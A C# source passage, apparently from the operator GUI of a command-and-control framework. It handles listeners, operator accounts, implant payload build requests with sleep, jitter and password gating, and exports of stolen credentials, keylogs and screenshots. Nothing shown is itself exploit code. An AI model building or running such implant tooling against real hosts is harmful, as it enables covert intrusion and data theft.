        /// <summary>按钮置灰的 ToolTip 文案。</summary>
        public const string BuiltinBlockWhy =
            "不可移除: 这是进程启动时的主 HTTP listener (服务端会拒绝删除), 需要换端口请改启动参数并重启服务端";

        /// <summary>
        /// 移除一个已解析的行: canRemove=false (主 listener) 时**不下发请求**,
        /// 直接如实回报原因, 保证界面行为与服务端一致 (灰按钮 + 明确理由)。
        /// </summary>
        public static string BlockedRemove(string name)
        {
            return "未下发: " + ((name ?? "").Length > 0 ? name : "该 listener") + " 是主 listener, " + BuiltinBlockWhy;
        }

        // ------------------------------------------------------------ 结果文案

        /// <summary>解析 POST /api/listener/add 的响应。</summary>
        public static ListenerOp AddResult(JsonElement root)
        {
            var op = new ListenerOp();
            if (root.ValueKind != JsonValueKind.Object)
            {
                op.Text = "创建 listener 失败: 服务端响应不是 JSON 对象";
                return op;
            }
            op.Ok = root.Bool("ok");
            // 服务端回传的实际绑定地址: 成功路径上是内核规范化后的值 (端口 0 / 双栈绑定
            // 会与用户输入不同), 失败路径上也回显请求里的 addr —— 两条路都如实保留原文。
            op.Addr = root.Str("addr");
            string err = root.Str("error");
            if (!op.Ok)
            {
                op.Text = err.Trim().Length > 0
                    ? err.Trim()                                        // 服务端 error 原样
                    : "创建 listener 失败: 服务端未给出 error 字段";
                return op;
            }
            op.Id = root.Str("id");
            string kind = root.Str("kind");
            string addr = op.Addr;
            string what = (kind.Length > 0 ? kind : "?") + "  " + (addr.Length > 0 ? addr : "?");
            op.Text = op.Id.Length > 0
                ? "已创建 listener: " + what + "  (id " + op.Id + ")"
                : "已创建 listener: " + what + "  (服务端未回传 id, 该行无法按 id 移除)";
            return op;
        }

        /// <summary>解析 POST /api/listener/remove 的响应。</summary>
        public static ListenerOp RemoveResult(JsonElement root)
        {
            var op = new ListenerOp();
            if (root.ValueKind != JsonValueKind.Object)
            {
                op.Text = "移除 listener 失败: 服务端响应不是 JSON 对象";
                return op;
            }
            op.Ok = root.Bool("ok");
            string err = root.Str("error");
            if (!op.Ok)
            {
                op.Text = err.Trim().Length > 0
                    ? err.Trim()                                        // 服务端 error 原样 (含"主 listener 不可删除")
                    : "移除 listener 失败: 服务端未给出 error 字段";
                return op;
            }
            op.Id = root.Str("id");
            op.Text = "已移除 listener" + (op.Id.Length > 0 ? " (id " + op.Id + ")" : "");
            return op;
        }

        /// <summary>移除按钮的 ToolTip (三种情况都说清)。</summary>
        public static string RemoveHint(int manageFlag, string name, string proto, string uri, string id)
        {
            if ((id ?? "").Trim().Length == 0)
                return "服务端未回传该 listener 的 id, 无法移除 (id 由服务端在 listeners[] 里给出)";
            if (manageFlag == ManageNo || (manageFlag == ManageUnknown && IsBuiltinRow(name, proto, uri)))
                return BuiltinBlockWhy;
            return "停止并移除 listener (POST /api/listener/remove id=" + id.Trim() + ")";
        }

        /// <summary>行主键: 优先服务端 id, 否则退化到 name|addr (Sync 才有稳定主键可合并)。</summary>
        public static string RowKey(string id, string name, string host, long port)
        {
            string k = (id ?? "").Trim();
            if (k.Length > 0) return "l|" + k;
            return "l|" + (name ?? "") + "|" + (host ?? "") + "|" + port;
        }

        /// <summary>
        /// 从 listeners[] 的一个元素取 id。服务端当前 (监听器增删落地前) 不给该字段,
        /// 故兼容 id / listener_id / handle 三种可能的名字, 取不到就回空串 ——
        /// 空串会让那一行的移除按钮置灰, 而不是拿 name 冒充 id 去撞服务端。
        /// </summary>
        public static string IdOf(JsonElement el)
        {
            string id = el.Str("id");
            if (id.Length == 0) id = el.Str("listener_id");
            if (id.Length == 0) id = el.Str("handle");
            return id.Trim();
        }
    }

    /// <summary>监听器增删的结果信封 (文案已可直接进状态栏/事件区)。</summary>
    public sealed class ListenerOp
    {
        public bool Ok;
        public string Id = "";
        /// <summary>服务端回传的实际绑定地址 (add 成功时非空)。</summary>
        public string Addr = "";
        public string Text = "";
    }

    // ---------------------------------------------------------------- 操作员账号

    /// <summary>
    /// 操作员账号管理 (解析 + 本地预判, 无 UI 依赖 —— --selftest 直接断言)。
    ///
    /// 服务端契约 (go/auth.go, **认证相关一律以它为准**):
    ///   POST /api/login        {user, pass}          -> {ok, token, role, user}
    ///   POST /api/logout       Authorization: Bearer -> {ok:true}
    ///   GET  /api/users        (需 admin)            -> {ok, users:[{user, role, last, last_text}]}
    ///   POST /api/user/new     (需 admin) {user, pass, role}
    ///   POST /api/user/delete  (需 admin) {user}
    ///   POST /api/user/pass    (需 admin) {user, pass}
    ///
    /// GUI 侧只做两件本地事:
    ///   ① 挡掉明显非法的输入 (口令长度 / 角色 / 两次口令不一致), 省一次往返;
    ///   ② 预判服务端**必然**会拒绝的删除 (删自己 / 删最后一个 admin), 先把服务端那句
    ///      原文摆在按钮 ToolTip 里而不是等撞 403/错误回话。
    /// 服务端真回的 error 一律**原样显示**, 不替换成自己的笼统文案。
    /// </summary>
    public static class AccountParse
    {
        /// <summary>= go/auth.go authMinPassLen。</summary>
        public const int MinPassLen = 8;
        /// <summary>= go/auth.go authMaxUserLen (按 rune 计)。</summary>
        public const int MaxUserLen = 64;

        public const string RoleAdmin = "admin";
        public const string RoleOperator = "operator";

        /// <summary>角色下拉的固定两项 (顺序固定: 默认选 operator, 与"最小权限"一致)。</summary>
        public static readonly string[] Roles = { RoleOperator, RoleAdmin };

        // ---- 服务端原文 (go/auth.go 逐字), 本地预判文案必须与服务端回话一字不差 ----
        public const string MsgUserEmpty = "用户名不能为空";
        /// <summary>服务端 fmt.Sprintf("口令至少 %d 个字符", authMinPassLen)。</summary>
        public const string MsgPassTooShort = "口令至少 8 个字符";
        public const string MsgRoleInvalid = "角色只能是 admin 或 operator";
        public const string MsgSelfDelete = "不能删除自己当前登录的账号";
        public const string MsgLastAdmin = "这是最后一个 admin, 删掉就没人能管理了";
        public const string MsgUserExists = "用户已存在";
        public const string MsgUserMissing = "用户不存在";
        public const string MsgNeedAdmin = "需要管理员(admin)权限";

        /// <summary>
        /// 复刻 go/auth.go 的 sanitizeUser: 去首尾空白 → 按 rune 截到 64 → 剔除控制字符
        /// (含 DEL)。GUI 侧先算一遍, 好处是"看起来有名字、清洗后为空"能当场报错,
        /// 而不是等 service 回一句"用户名不能为空"。
        /// </summary>
        public static string SanitizeUser(string s)
        {
            s = (s ?? "").Trim();
            var runes = s.ToCharArray();          // C# char 即 UTF-16 码元; Go 的 []rune 按码点限长
            if (runes.Length > MaxUserLen) s = new string(runes, 0, MaxUserLen);
            var sb = new StringBuilder(s.Length);
            foreach (char ch in s)
            {
                if (ch < 0x20 || ch == 0x7f) continue;
                sb.Append(ch);
            }
            return sb.ToString();
        }

        public static string NormalizeRole(string role) { return (role ?? "").Trim().ToLowerInvariant(); }
        public static bool ValidRole(string role) { return NormalizeRole(role) == RoleAdmin || NormalizeRole(role) == RoleOperator; }
        public static bool IsAdmin(string role) { return NormalizeRole(role) == RoleAdmin; }

        /// <summary>角色下拉: operator 在前 (默认最小权限), 标注清楚各自能做什么。</summary>
        public static List<RoleOption> RoleOptions()
        {
            return new List<RoleOption>
            {
                new RoleOption { Value = RoleOperator, Label = "operator（只读 + 下发命令, 不能管理账号）" },
                new RoleOption { Value = RoleAdmin, Label = "admin（全部权限, 含账号管理）" },
            };
        }

        /// <summary>新建账号的本地校验: 返回第一处问题 (空串 = 通过)。</summary>
        public static string ValidateNewUser(string user, string pass, string confirm, string role)
        {
            string u = SanitizeUser(user);
            if (u.Length == 0)
                return "请填写用户名 (服务端会按 sanitizeUser 清洗: 去首尾空白 + 去控制字符, 清洗后为空即非法)";
            if ((pass ?? "").Length < MinPassLen)
                return "口令至少 " + MinPassLen + " 个字符 (服务端 authMinPassLen = " + MinPassLen + ")";
            if (!string.Equals(pass ?? "", confirm ?? "", StringComparison.Ordinal))
                return "两次输入的口令不一致";
            if (!ValidRole(role))
                return MsgRoleInvalid + " (可选: " + RoleAdmin + " / " + RoleOperator + ")";
            return "";
        }

        /// <summary>改口令的本地校验 (用户名不可改, 只校验两次口令)。</summary>
        public static string ValidatePass(string user, string pass, string confirm)
        {
            if (SanitizeUser(user).Length == 0) return "缺少要改口令的账号名";
            if ((pass ?? "").Length < MinPassLen)
                return "口令至少 " + MinPassLen + " 个字符 (服务端 authMinPassLen = " + MinPassLen + ")";
            if (!string.Equals(pass ?? "", confirm ?? "", StringComparison.Ordinal))
                return "两次输入的口令不一致";
            return "";
        }

        /// <summary>解析 POST /api/login 的响应 (令牌 + 角色)。</summary>
        public static LoginResult Login(JsonElement root)
        {
            var r = new LoginResult();
            if (root.ValueKind != JsonValueKind.Object)
            {
                r.Error = "登录响应不是 JSON 对象";
                return r;
            }
            r.Ok = root.Bool("ok");
            r.Error = root.Str("error");
            r.Token = root.Str("token").Trim();
            r.Role = NormalizeRole(root.Str("role"));
            r.User = SanitizeUser(root.Str("user"));
            if (r.Ok && r.Token.Length == 0)
            {
                r.Ok = false;
                r.Error = "服务端返回 ok 但未包含 token 字段";
            }
            if (!r.Ok && r.Error.Trim().Length == 0) r.Error = "登录失败";
            return r;
        }

        /// <summary>
        /// 解析 GET /api/users 的 users[]。selfUser 是当前登录账号 (用于"不能删自己")。
        /// 元素不是对象 / user 为空一律跳过; 整块缺失回空表 (页面显示空表而不是抛异常)。
        /// </summary>
        public static List<OperatorRow> Users(JsonElement root, string selfUser)
        {
            var rows = new List<OperatorRow>();
            if (root.ValueKind != JsonValueKind.Object) return rows;

            foreach (var el in root.Arr("users"))
            {
                if (el.ValueKind != JsonValueKind.Object) continue;
                string u = el.Str("user");
                if (u.Length == 0) continue;
                var r = new OperatorRow();
                r.User = u;
                r.Role = NormalizeRole(el.Str("role"));
                r.Last = el.Long("last");
                r.LastTextRaw = el.Str("last_text");
                rows.Add(r);
            }

            int admins = 0;
            for (int i = 0; i < rows.Count; i++) if (IsAdmin(rows[i].Role)) admins++;
            string me = SanitizeUser(selfUser ?? "");
            for (int i = 0; i < rows.Count; i++)
            {
                rows[i].AdminCount = admins;
                rows[i].IsSelf = me.Length > 0 && string.Equals(me, rows[i].User, StringComparison.Ordinal);
            }
            return rows;
        }

        /// <summary>
        /// 删除按钮能否点。**本地预判服务端的硬规则** (go/auth.go handleUserDelete):
        /// 删自己 → 拒; 删最后一个 admin → 拒。两者都不下发请求冒烟。
        /// </summary>
        public static bool CanDelete(bool isSelf, string role, int adminCount)
        {
            if (isSelf) return false;
            if (IsAdmin(role) && adminCount <= 1) return false;
            return true;
        }

        /// <summary>删除按钮的 ToolTip: 不可删时直接给出服务端会回的那句原文。</summary>
        public static string DeleteHint(bool isSelf, string role, int adminCount, string user)
        {
            string who = (user ?? "").Length > 0 ? user : "该账号";
            if (isSelf) return "不可删除: " + who + " 是当前登录的账号 —— 服务端会拒绝并回「" + MsgSelfDelete + "」";
            if (IsAdmin(role) && adminCount <= 1)
                return "不可删除: " + who + " 是最后一个 admin —— 服务端会拒绝并回「" + MsgLastAdmin + "」";
            return "删除账号 " + who + " (POST /api/user/delete, 二次确认后下发)";
        }

        /// <summary>删除前的二次确认正文 (含服务端会拒绝的两种情况, 先说清楚)。</summary>
        public static string DeleteConfirm(string user, string role)
        {
            string who = (user ?? "").Length > 0 ? user : "(空)";
            return "删除操作员账号 " + who + (NormalizeRole(role).Length > 0 ? " (" + NormalizeRole(role) + ")" : "") + "?\n\n"
                 + "· 该账号已发出的令牌会被服务端立即撤销\n"
                 + "· 服务端拒绝删除自己, 也拒绝删掉最后一个 admin";
        }

        /// <summary>
        /// 账号管理区的可用性 (三态)。
        ///
        /// 只有 token 的 role 明确是 admin 才"确定可用"; operator 直接禁用并说明原因
        /// (不等撞 403); 未登录则保持可用但如实标注 —— 服务端以 -auth=off 启动时无需
        /// 认证即可管理账号, 此时把面板锁死反而与"GUI 覆盖全部功能"相悖。
        /// </summary>
        public static AccountAccess Access(string role)
        {
            var a = new AccountAccess();
            string r = NormalizeRole(role);
            if (r == RoleAdmin)
            {
                a.CanManage = true;
                a.Note = "当前登录角色 admin: 可增删账号与改口令 (对应 GET /api/users 与 POST /api/user/*)。";
            }
            else if (r == RoleOperator)
            {
                a.CanManage = false;
                a.Note = "当前登录角色 operator: 账号管理不可用 —— 服务端对 /api/users 与 /api/user/* "
                       + "要求 admin (operator 会拿到 403「" + MsgNeedAdmin + "」)。请用 admin 账号重新登录。";
            }
            else
            {
                a.CanManage = true;
                a.Note = "未登录: 服务端若启用访问控制 (默认 -auth=on), /api/users 会回 401「未认证或令牌已失效」, "
                       + "点顶栏『登录』填入 admin 即可; 若服务端以 -auth=off 启动则无鉴权, 可直接管理。";
            }
            a.Role = r;
            return a;
        }

        /// <summary>
        /// 账号接口结果文案。ok=true 给出做了什么, ok=false **原样**回服务端 error。
        /// action: "添加" / "删除" / "改口令"。
        /// </summary>
        public static AccountOp Result(JsonElement root, string action, string user, string role)
        {
            var op = new AccountOp();
            op.User = user ?? "";
            string what = (action ?? "").Length > 0 ? action : "操作";

            if (root.ValueKind != JsonValueKind.Object)
            {
                op.Text = what + "账号失败: 服务端响应不是 JSON 对象";
                return op;
            }
            op.Ok = root.Bool("ok");
            if (!op.Ok)
            {
                string err = root.Str("error").Trim();
                op.Error = err.Length > 0 ? err : "服务端未给出 error 字段";
                op.Text = op.Error;                       // 原样, 不加前缀不改写
                return op;
            }

            string u = root.Str("user");
            if (u.Length == 0) u = op.User;
            string rl = NormalizeRole(root.Str("role"));
            if (rl.Length == 0) rl = NormalizeRole(role);
            op.Role = rl;

            if (what == "删除") op.Text = "已删除账号 " + u;
            else if (what == "改口令")
                op.Text = "已修改 " + u + " 的口令 (服务端会撤销该账号已发出的令牌, 它需要重新登录)";
            else op.Text = "已添加账号 " + u + (rl.Length > 0 ? " (" + rl + ")" : "");
            return op;
        }
    }

    /// <summary>登录响应 (token + 角色 + 用户名)。</summary>
    public sealed class LoginResult
    {
        public bool Ok;
        public string Token = "";
        public string Role = "";
        public string User = "";
        public string Error = "";
    }

    /// <summary>账号接口的结果信封 (文案可直接进状态栏)。</summary>
    public sealed class AccountOp
    {
        public bool Ok;
        public string User = "";
        public string Role = "";
        public string Error = "";
        public string Text = "";
    }

    /// <summary>账号管理区的可用性判定结果。</summary>
    public sealed class AccountAccess
    {
        public bool CanManage;
        public string Role = "";
        public string Note = "";
    }

    /// <summary>
    /// 监听器类型下拉的一项 (kind + 显示名 + 运行期是否支持)。
    ///
    /// <b>必须是属性, 不能是 public 字段</b>: ListenerDialog 用 DisplayMemberPath="Label"
    /// 渲染它, 而 DisplayMemberPath 与 {Binding} 走的都是 WPF 绑定路径, 只解析 CLR 属性 ——
    /// 写成 public 字段时绑定**静默失败**, 下拉里显示成 "CsdevGui.KindOption" 这个类型名,
    /// 也就是操作员看到的"选项框里全是看不懂的东西"。
    /// 实测由 CSDEV_GUI_COMBO_PROBE 抓出 (选中=CsdevGui.KindOption)。
    /// 与 ScriptItem 是同一个坑, 见下方 ScriptItem 的注释。
    /// </summary>
    public sealed class KindOption
    {
        public string Kind { get; set; } = "";
        public string Label { get; set; } = "";
        public bool Supported { get; set; } = true;
    }

    /// <summary>角色下拉的一项 (服务端取值 + 中文说明)。同样是属性 —— 理由见 KindOption。</summary>
    public sealed class RoleOption
    {
        public string Value { get; set; } = "";
        public string Label { get; set; } = "";
    }

    // ---------------------------------------------------------------- 载荷请求体

    /// <summary>
    /// POST /api/payload/build 的请求体构造 (纯函数, --selftest 直接断言序列化结果)。
    ///
    /// 单独抽出来的原因: 字段名 (尤其 <c>out_file</c> 的下划线) 与"哪些字段该省略"
    /// 一旦拼错, 服务端只会报参数错误, 很难定位。这里把请求体变成可断言的对象。
    ///
    /// <c>no_sleep</c> = true 时**整块省掉** sleep/jitter (v1 生成器不认这两个参数,
    /// 由 GUI 的降级重试触发, 见 MainWindow.BuildOnceAsync)。
    /// <c>password</c> 非空才出现 —— 留空即不加门控, 服务端按无门控编译。
    /// </summary>
    public static class PayloadRequest
    {
        private static readonly JsonSerializerOptions Compact = new JsonSerializerOptions();

        public static Dictionary<string, object> Build(string fmt, string host, long port, bool ssl,
                                                       string outFile, long sleep, long jitter, bool noSleep,
                                                       string password)
        {
            var body = new Dictionary<string, object>();
            body["format"] = fmt;
            body["host"] = host;
            body["port"] = port;
            body["ssl"] = ssl;
            body["out_file"] = outFile ?? "";
            if (!noSleep)
            {
                body["sleep"] = sleep;
                body["jitter"] = jitter;
            }
            string pw = password ?? "";
            if (pw.Length > 0) body["password"] = pw;   // 空口令: 键都不出现 (留空=不加门控)
            return body;
        }

        /// <summary>请求体的 JSON 原文 (自测据此断言字段名与省略规则)。</summary>
        public static string Json(Dictionary<string, object> body)
        {
            return JsonSerializer.Serialize(body, Compact);
        }

        /// <summary>
        /// 本地校验启动口令, 返回可读提示 (空串 = 通过)。
        ///
        /// 与生成器 tools/gen_payload2.ps1 的校验顺序一致 (先长度后空白), 目的有二:
        /// 不让用户白等一次同步编译才发现打错; 以及**不让明文口令进服务端日志**——
        /// 生成器的 throw 消息里带着口令原文, 那会被服务端原样回传并落进 GUI 生成日志。
        /// </summary>
        public static string PasswordProblem(string pw)
        {
            if (pw == null || pw.Length == 0) return "";     // 留空 = 不加门控, 合法
            if (pw.Length < 4)
                return "口令太短 (至少 4 个字符): 植入体侧与生成器同规则; 留空表示不启用启动口令门控";
            foreach (char ch in pw)
            {
                if (char.IsWhiteSpace(ch))
                    return "口令不能含空白字符 (空格 / Tab / 换行): 植入体按空白切分命令行; 留空表示不启用门控";
            }
            return "";
        }

        /// <summary>
        /// 日志脱敏: 口令非空时把其中的口令明文换成掩码。
        ///
        /// 生成器自身不复述口令, 但它的 **throw 消息里带着明文** (例如"口令不能含空白字符: xxx"),
        /// 服务端把 CombinedOutput 原样回传, 于是明文会出现在生成日志里。
        /// 本地校验已经先拦掉这一类, 这里再兜一层: 日志可以少一行真相, 但不能当场泄露口令。
        /// </summary>
        public static string RedactPassword(string text, string pw)
        {
            if (string.IsNullOrEmpty(text)) return text ?? "";
            if (string.IsNullOrEmpty(pw)) return text;
            if (text.IndexOf(pw, StringComparison.Ordinal) < 0) return text;
            return text.Replace(pw, "******(口令明文已隐去)");
        }
    }

    // ---------------------------------------------------------------- 报告导出

    /// <summary>
    /// 报告导出下拉的一项 (kind + 中文名 + 扩展名)。
    ///
    /// **必须是属性, 不能是 public 字段**: XAML 的 DisplayMemberPath="Label" 走 WPF 绑定路径,
    /// 绑定只认属性。字段版本的表现是下拉项全空白, 而且只在你打开服务端页时才在绑定日志里
    /// 留一条 'Label' property not found —— 本轮就是这么发现的 (与 HANDOVER 第 49 条同一坑,
    /// 插件菜单树曾因 public 字段整棵空白)。
    /// </summary>
    public sealed class ReportExport
    {
        public string Kind { get; set; }
        public string Label { get; set; }
        public string Ext { get; set; }
        public string Mime { get; set; }

        public ReportExport() { Kind = ""; Label = ""; Ext = ""; Mime = ""; }

        public ReportExport(string kind, string label, string ext, string mime)
        {
            Kind = kind ?? "";
            Label = label ?? "";
            Ext = ext ?? "";
            Mime = mime ?? "";
        }
    }

    /// <summary>
    /// /api/report/{json,html,csv} 的 URL 拼装与保存文案 (纯函数, --selftest 直接断言)。
    ///
    /// 关键事实 (go/report.go, 只读核对):
    ///   1. 三个端点回的都是**文件流** —— JSON 端点也回 Content-Type: application/json,
    ///      但它是整份快照 (带 BOM 与否取决于端点), 保存时必须原样写字节, 不能重新序列化;
    ///   2. CSV 恒以 EF BB BF 开头 (Excel 靠它认中文), **不许做编码转换**;
    ///   3. kind 为空时服务端按 sessions 处理, 但 GUI 永远显式下传, 免得"空参数"和
    ///      "用户真选了 sessions" 在日志里分不清;
    ///   4. 未知 kind 服务端回 **HTTP 400 + JSON 正文** (Content-Type 变成 application/json),
    ///      所以保存前必须先看状态码 —— 拿字节直接落盘会存下一份名叫 .csv 的错误说明。
    /// </summary>
    public static class ReportParse
    {
        /// <summary>kind 取值与中文名 —— 顺序与服务端 reportCSVKinds 一致。</summary>
        public static readonly ReportExport[] Kinds =
        {
            new ReportExport { Kind = "sessions",    Label = "会话 sessions",     Ext = "csv", Mime = "text/csv" },
            new ReportExport { Kind = "credentials", Label = "凭据 credentials",  Ext = "csv", Mime = "text/csv" },
            new ReportExport { Kind = "downloads",   Label = "下载 downloads",    Ext = "csv", Mime = "text/csv" },
            new ReportExport { Kind = "events",      Label = "事件 events",       Ext = "csv", Mime = "text/csv" },
            new ReportExport { Kind = "screenshots", Label = "截屏 screenshots",  Ext = "csv", Mime = "text/csv" },
            new ReportExport { Kind = "keylogs",     Label = "键盘记录 keylogs",  Ext = "csv", Mime = "text/csv" },
            new ReportExport { Kind = "jobs",        Label = "作业 jobs",         Ext = "csv", Mime = "text/csv" },
        };

        public static string JsonUrl { get { return "/api/report/json"; } }
        public static string HtmlUrl { get { return "/api/report/html"; } }

        /// <summary>CSV 端点 URL。kind 会转义 (空格/中文/斜杠都不该直传)。</summary>
        public static string CsvUrl(string kind)
        {
            return "/api/report/csv?kind=" + Uri.EscapeDataString((kind ?? "").Trim());
        }

        /// <summary>下拉选项的中文名; 未知 kind 原样回, 不编造标签。</summary>
        public static string Label(string kind)
        {
            string k = (kind ?? "").Trim().ToLowerInvariant();
            for (int i = 0; i < Kinds.Length; i++)
                if (Kinds[i].Kind == k) return Kinds[i].Label;
            return k;
        }

        public static bool IsKnown(string kind)
        {
            string k = (kind ?? "").Trim().ToLowerInvariant();
            for (int i = 0; i < Kinds.Length; i++)
                if (Kinds[i].Kind == k) return true;
            return false;
        }

        /// <summary>
        /// 默认保存文件名 <c>csdev-report-&lt;kind&gt;-&lt;时间戳&gt;.&lt;扩展名&gt;</c>。
        /// 时间戳由调用方给出 (自测里传常量, 免得断言随秒变化)。
        ///
        /// kind 会过一遍文件名过滤: 它最终被填进 SaveFileDialog 的默认名, 带
        /// `\ / : ?` 这类字符只会让人以为文件存到了别的目录。中文保留 (Windows 文件名合法)。
        /// </summary>
        public static string FileName(string kind, string ext, DateTime when)
        {
            string k = FileFilter((kind ?? "").Trim().ToLowerInvariant());
            if (k.Length == 0) k = "report";
            string e = FileFilter((ext ?? "").TrimStart('.'));
            if (e.Length == 0) e = "bin";
            return "csdev-report-" + k + "-" + when.ToString("yyyyMMdd_HHmmss") + "." + e;
        }

        /// <summary>
        /// 文件名合法字符过滤: 只留"不是非法字符、不是路径分隔符、不是控制字符"的字符。
        /// 用白名单式排除而不是 Path.GetInvalidFileNameChars() 单查 —— 后者在
        /// .NET 里已含 <c>/</c> 与 <c>\</c>, 这里显式再挡一层, 免得换平台时行为变化。
        /// </summary>
        public static string FileFilter(string s)
        {
            if (string.IsNullOrEmpty(s)) return "";
            var sb = new StringBuilder(s.Length);
            foreach (char ch in s)
            {
                if (ch == '/' || ch == '\\') continue;
                if (ch < ' ') continue;
                if (Array.IndexOf(Path.GetInvalidFileNameChars(), ch) >= 0) continue;
                sb.Append(ch);
            }
            return sb.ToString();
        }

        /// <summary>字节数文案 (状态栏用, 与 Fmt.Size 同一口径: 绝对字节数 + 人类可读)。</summary>
        public static string BytesText(long n)
        {
            return n.ToString() + " 字节 (" + Fmt.Size(n) + ")";
        }

        /// <summary>
        /// 保存成功的状态栏文案: **绝对路径** + 字节数。HTML 报告没有 Content-Disposition,
        /// 更没有"文件名", 只有这里写下来的落盘路径才是操作员能复核的事实。
        /// </summary>
        public static string SavedText(string absolutePath, long bytes)
        {
            return "已保存: " + (absolutePath ?? "") + "   (" + BytesText(bytes) + ")";
        }

        /// <summary>
        /// 保存失败的文案。401 单独点名"需要登录" —— /api/report/* 是唯一
        /// 默认 fail-closed 的数据出口 (go/report.go 顶部注释), 未登录时最常撞到的就是它。
        /// 其余状态码沿用 ApiError 的既有口径, 服务端正文原样保留。
        /// </summary>
        public static string SaveErrorText(string what, int code, string body, string path)
        {
            string head = (what ?? "").Trim();
            if (head.Length > 0) head += "失败: ";
            string tail = ApiError.Describe(code, body, path);
            if (code == 401) tail = "需要登录 —— " + tail;
            return head + tail;
        }
    }

    // ---------------------------------------------------------------- 下载文件内容

    /// <summary>
    /// /api/download/file 取回的字节的**显示决策** (纯函数, 无 UI 依赖)。
    ///
    /// 为什么不能直接塞给文本框: 下载下来的东西可能是什么都有 (PE / zip / 加密载荷),
    /// 强行按 UTF-8 解码会得到一屏替换字符, 看着像"内容就是这样"。所以这里先判定
    /// 文本还是二进制, 二进制**如实说明**并只给大小 + 十六进制, 不假装能显示。
    ///
    /// 判定顺序 (任一命中即二进制, 不猜):
    ///   1. 含 NUL (0x00): 文本文件不会有;
    ///   2. 严格 UTF-8 解码失败, 且 GBK 也解释不出足够的汉字 (无效序列 / 替换字符);
    ///   3. 控制字符 (除 \t \r \n) 占比 &gt; 8%。
    /// </summary>
    public sealed class DownloadContent
    {
        /// <summary>完整原始字节 (十六进制视图按它逐字节渲染, 不做截断)。</summary>
        public readonly byte[] Bytes;
        /// <summary>前 <see cref="Preview"/> 字节的十六进制 (判定为二进制时的头部预览)。</summary>
        public readonly byte[] Preview;

        public bool IsBinary;
        public string Text = "";
        public int ControlChars;
        public int Replaced;

        private DownloadContent(byte[] b, byte[] preview)
        {
            Bytes = b;
            Preview = preview;
        }

        public long Size { get { return Bytes == null ? 0 : Bytes.Length; } }
        public bool IsEmpty { get { return Size == 0; } }
        public string SizeText { get { return Fmt.Size(Size); } }

        /// <summary>头部预览的十进制逐字节 (证据里要能核对"前 N 字节到底是不是这些")。</summary>
        public string HeadBytesText()
        {
            if (Preview == null || Preview.Length == 0) return "(空)";
            var sb = new StringBuilder(Preview.Length * 4);
            for (int i = 0; i < Preview.Length; i++)
            {
                if (i > 0) sb.Append(' ');
                sb.Append(Preview[i].ToString());
            }
            return sb.ToString();
        }

        /// <summary>控制字符 / 替换字符占比 (判定依据要能原样打印出来, 不能只说"像二进制")。</summary>
        public string RatioText()
        {
            if (Size == 0) return "0/0";
            return ControlChars.ToString() + "/" + Size.ToString() + " 控制字符, "
                 + Replaced.ToString() + " 替换字符";
        }

        /// <summary>只读窗口的标题文案。</summary>
        public string TitleText(string name)
        {
            string n = (name ?? "").Trim();
            if (n.Length == 0) n = "(未命名)";
            return "下载内容: " + n + "   " + SizeText + "   " + (IsBinary ? "二进制" : "文本");
        }

        /// <summary>文本视图正文 (剥掉 UTF-8 BOM 再显示, 否则首行会顶一个不可见字符)。</summary>
        public string TextBody()
        {
            if (IsEmpty) return "(0 字节, 文件为空)";
            if (IsBinary) return BinaryBody();
            return Codec.Clean(Text);
        }

        /// <summary>
        /// 二进制视图正文: 如实说明 + 大小 + 前 <see cref="Preview"/> 字节的十六进制 + 全量转储。
        /// 第一行刻意不写"无法显示", 而是写清楚**为什么** —— 操作员看到的是事实, 不是借口。
        /// </summary>
        public string BinaryBody()
        {
            var sb = new StringBuilder();
            sb.Append("[二进制内容: 不是可显示的文本, 因此不按文本渲染]\n");
            sb.Append("大小: ").Append(Bytes.Length.ToString()).Append(" 字节 (").Append(SizeText).Append(")\n");
            sb.Append("判定依据: ").Append(RatioText()).Append('\n');
            sb.Append("前 ").Append(Preview == null ? 0 : Preview.Length).Append(" 字节的十六进制:\n");
            sb.Append(HexDump(Preview));
            sb.Append("\n---- 完整十六进制转储 (").Append(Bytes.Length.ToString()).Append(" 字节) ----\n");
            sb.Append(HexDump(Bytes));
            return sb.ToString();
        }

        /// <summary>头部预览字节数 (二进制判定时给前若干字节)。</summary>
        public const int PreviewBytes = 256;

        /// <summary>服务端在记录不存在时回的纯文本 (http.NotFound)。</summary>
        public const string NotFoundBody = "404 page not found";

        /// <summary>下载记录不存在时的文案。</summary>
        public const string MissingRecordText =
            "该下载记录不存在 (服务端 /api/downloads 里没有这一条, 可能已被清理或服务端换了 data/)";

        /// <summary>
        /// 「查看内容」失败时的状态栏文案。
        ///
        /// 这里必须**先判 404 再套通用文案**: /api/download/file 对"记录不存在"回的也是
        /// 那个纯文本 404 page not found, 与"路由不存在"完全同形。直接让 ApiError 去解释
        /// 会得到"服务端二进制过旧", 而这个端点在实机上明明是通的 —— 实测就踩到过。
        /// 所以只有正文不像 Go 的 http.NotFound 时, 才回退到通用口径。
        /// </summary>
        public static string ErrorText(string name, int code, string body)
        {
            string n = (name ?? "").Trim();
            if (n.Length == 0) n = "(未命名)";
            if (code == 404)
            {
                string b = (body ?? "").Trim();
                if (b.Length == 0 || b.StartsWith(NotFoundBody, StringComparison.Ordinal))
                    return "取回下载内容失败: #" + n + "  " + MissingRecordText;
            }
            return "取回下载内容失败: #" + n + "  " + ApiError.Describe(code, body, "/api/download/file");
        }

        /// <summary>一次调用做完判定 + 正文生成 (界面只用这一个入口)。</summary>
        public static DownloadContent Parse(byte[] data)
        {
            byte[] b = data ?? new byte[0];
            int plen = b.Length < PreviewBytes ? b.Length : PreviewBytes;
            var preview = new byte[plen];
            Array.Copy(b, preview, plen);

            var dc = new DownloadContent(b, preview);
            if (b.Length == 0) return dc;

            // 1) NUL: 文本文件不会有
            for (int i = 0; i < b.Length; i++)
                if (b[i] == 0) { dc.IsBinary = true; break; }

            // 2) 编码: 严格 UTF-8 优先, 失败试 GBK
            string utf8 = TryStrictUtf8(b);
            if (utf8 != null)
            {
                dc.Text = utf8;
            }
            else
            {
                // Codec.Gbk 走 MultiByteToWideChar(CP_GBK), 对无效序列要么跳过要么给 U+FFFD;
                // 于是"GBK 能不能解释成中文"就成了 UTF-8 失败后的第二道判据:
                //   - 真 GBK 文本: 中文/全角占非 ASCII 字符的一半以上
                //   - 二进制乱码:   高位字节多数解不出汉字 (替换字符 / 拉丁杂字) —— 如实算二进制
                string gbk = Codec.Gbk(b);
                dc.Replaced = CountChar(gbk, '\uFFFD');
                dc.Text = gbk;
                int cjk = 0;
                for (int i = 0; i < gbk.Length; i++)
                {
                    char ch = gbk[i];
                    if (ch >= '\u4E00' && ch <= '\u9FFF') cjk++;
                }
